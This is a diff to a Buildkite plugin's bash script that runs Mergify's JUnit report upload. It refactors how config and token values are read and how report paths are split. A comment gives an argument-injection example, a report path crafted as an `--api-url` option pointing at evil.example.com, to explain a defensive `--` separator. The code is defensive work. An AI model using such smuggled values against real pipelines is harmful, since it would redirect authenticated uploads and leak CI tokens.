@@ -9,14 +9,14 @@ run_junit_process() {
   log_info "Processing JUnit reports..."
 
   local report_path
-  report_path="$(plugin_config_required REPORT_PATH)"
+  plugin_config_required report_path REPORT_PATH
 
   # Export Mergify environment
   export MERGIFY_API_URL
-  MERGIFY_API_URL="$(resolve_api_url)"
+  resolve_api_url MERGIFY_API_URL
 
   local token
-  token="$(resolve_token)" || exit 1
+  resolve_token token
   if [[ -n "$token" ]]; then
     export MERGIFY_TOKEN="$token"
   fi
@@ -27,7 +27,7 @@ run_junit_process() {
   # back to the auto-detected step label — so the property looks wired up
   # while doing nothing.
   local job_name
-  job_name="$(plugin_config JOB_NAME "${BUILDKITE_LABEL:-}")"
+  plugin_config job_name JOB_NAME "${BUILDKITE_LABEL:-}"
   if [[ -n "$job_name" ]]; then
     export MERGIFY_TEST_JOB_NAME="$job_name"
   fi
@@ -47,8 +47,14 @@ run_junit_process() {
   # `--api-url=http:evil.example.com#.xml` into an argv entry the CLI parses
   # as an option, sending the authenticated upload to the attacker. The CLI
   # expands the patterns itself, and `--` covers what is left.
+  #
+  # `-d ''` reads every line, not just the first, so the blank check in
+  # plugin_config_required means this yields at least one path. It has to: an
+  # empty "${report_paths[@]}" is an unbound variable under `set -u` before
+  # bash 4.4, and macOS agents run bash 3.2. read fails at the end of input
+  # with no NUL to stop at, hence `|| true`.
   local -a report_paths
-  read -ra report_paths <<<"$report_path"
+  read -r -d '' -a report_paths <<<"$report_path" || true
 
   # Run junit-process. The CLI's own output explains upload and
   # quarantine status; propagate its exit code so the Buildkite step
